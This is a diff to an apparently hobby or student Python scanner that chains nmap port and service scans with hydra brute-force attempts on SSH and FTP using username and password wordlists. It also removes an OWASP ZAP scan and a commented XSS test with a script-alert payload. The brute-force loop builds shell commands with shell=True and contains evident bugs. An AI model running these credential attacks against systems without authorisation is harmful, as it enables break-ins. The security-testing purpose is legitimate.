@@ -7,35 +7,36 @@ from zapv2 import ZAPv2
 import time
 
 
-class WebApp:
+class WebScanner:
 
     ports_scanned = []
     ssh_port = 0
     ftp_port = 0
-    
+    web_dirs = []
+    xss_vulnr = []
+    sqli_vulnr = []
 
-    usernames = ['admin', 'root', 'user']
-    passwords = ['password1', 'password2', 'password3']
+    usernames = open("../wordlists/usernames.txt", "r")
+    passwords = open("../wordlists/passwords.txt", "r")
 
-   
 
     def __init__(self, domain) -> None:
         self.domain = domain
         
-    '''---Nmap function--- '''
-    #Implement the hydra for the FTP and SSH credentials 
+    '''---Nmap function Implement the hydra for the FTP and SSH credentials with SSL Certificates---'''
 
-    def nmap(domain, ports):
+
+    def nmap_hydra_ssl(domain, ports):
          # Define the hydra command for SSH brute-force
-        ssh_command = f'hydra -l %s -P %s ssh://{domain}:{WebApp.ssh_port}'
+        ssh_command = f'hydra -l %s -P %s ssh://{domain}:{WebScanner.ssh_port}'
 
         # Define the hydra command for FTP brute-force
-        ftp_command = f'hydra -l %s -P %s ftp://{domain}:{WebApp.ftp_port}'
+        ftp_command = f'hydra -l %s -P %s ftp://{domain}:{WebScanner.ftp_port}'
 
         nm = nmap.PortScanner()
         # ports = '1-1000'
 
-        nm.scan(domain, arguments=f'{ports} -p- -sV -O')
+        nm.scan(domain, arguments=f'{ports} -p- --script ssl-enum-ciphers -sV -O')
 
         # Loop through each host that was scanned
         for host in nm.all_hosts():
@@ -46,11 +47,11 @@ class WebApp:
                 if nm[host]['tcp'][port]['state'] == 'open':
                     if nm[host]['tcp'][port]['name'] == 'ssh':
                         print('SSH is open on port', port, 'on host', host)
-                        WebApp.ssh_port = port
+                        WebScanner.ssh_port = port
 
                         #---Hydra SSH---
-                        for username in WebApp.usernames:
-                            for password in WebApp.passwords:
+                        for username in WebScanner.usernames:
+                            for password in WebScanner.passwords:
                                 # Execute the SSH brute-force command with the current username and password
                                 ssh_process = subprocess.Popen(ssh_command % (username, password), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                                 ssh_output, ssh_error = ssh_process.communicate()
@@ -61,11 +62,11 @@ class WebApp:
 
                     elif nm[host]['tcp'][port]['name'] == 'ftp':
                         print('FTP is open on port', port, 'on host', host)
-                        WebApp.ftp_port = port
+                        WebScanner.ftp_port = port
 
                         #---Hydra FTP---
-                        for username in WebApp.usernames:
-                            for password in WebApp.passwords:
+                        for username in WebScanner.usernames:
+                            for password in WebScanner.passwords:
                                 ftp_process = subprocess.Popen(ftp_command % (username, password), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                                 ftp_output, ftp_error = ftp_process.communicate()
                                 
@@ -88,9 +89,9 @@ class WebApp:
                     for port in lport:
                         print ('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
                         port_scanned = {'port': port, 'status': nm[host][proto][port]['state']}
-                        WebApp.ports_scanned.append(port_scanned)
+                        WebScanner.ports_scanned.append(port_scanned)
                         
-            print(WebApp.ports_scanned)
+            print(WebScanner.ports_scanned)
             
             # if 'osmatch' in nm[host]:
             #     for osmatch in nm[host]['osmatch']:
@@ -113,66 +114,12 @@ class WebApp:
 
             #             print("=============")
 
-    def owasp_zap(domain):
-        zap = ZAPv2(proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'})
-        zap.spider.scan(domain)
-        while (int(zap.spider.status()) < 100):
-            print('Spider progress %: ' + zap.spider.status())
-            time.sleep(5)
-        
-        zap.ascan.scan(domain)
-        while (int(zap.ascan.status()) < 100):
-            print('Scan progress %: ' + zap.ascan.status())
-            time.sleep(5)
+    def get_dirs(self):
 
-        alerts = zap.core.alerts()
-
-        # Print the alerts
-        for alert in alerts:
-            print(alert)
-                
+        return self.web_dirs
     
-    # def xss_attack():
-    #     # Set up a Selenium webdriver instance with headless mode
-    #     chrome_options = Options()
-    #     chrome_options.add_argument("--headless")
-    #     driver = webdriver.Chrome(options=chrome_options)
+    def xss_payloads_check(self):
+        pass
 
-    #     # Navigate to the login page of the web application you want to test
-    #     driver.get("https://example.com/login")
-
-    #     # Find the input field where you want to inject the payload
-    #     input_field = driver.find_element("username")
-
-    #     # Inject a simple XSS payload into the input field
-    #     payload = "<script>alert('XSS!');</script>"
-    #     input_field.send_keys(payload)
-
-    #     # Submit the form and see if the payload is executed
-    #     submit_button = driver.find_element("submit")
-    #     submit_button.click()
-
-    #     # Check if the payload was executed
-    #     if "XSS!" in driver.page_source:
-    #         print("XSS vulnerability detected!")
-    #     else:
-    #         print("XSS vulnerability not detected.")
-
-    
-
-# Check if parameter is passed through command line
-
-if __name__ == "__main__":
-
-    if len(sys.argv) > 1:
-        domain = sys.argv[1]
-        print("The domain is: ", domain)
-        # nmap_ports = input("Enter the ports for the scan (format x-xxx): ")
-
-        WebApp = WebApp
-        # WebApp.nmap(domain, nmap_ports)
-        # WebApp.xss_attack()
-        WebApp.owasp_zap(domain)
-
-    else:
-        print("Enter the domain name")
+    def sqli_check(self):
+        pass
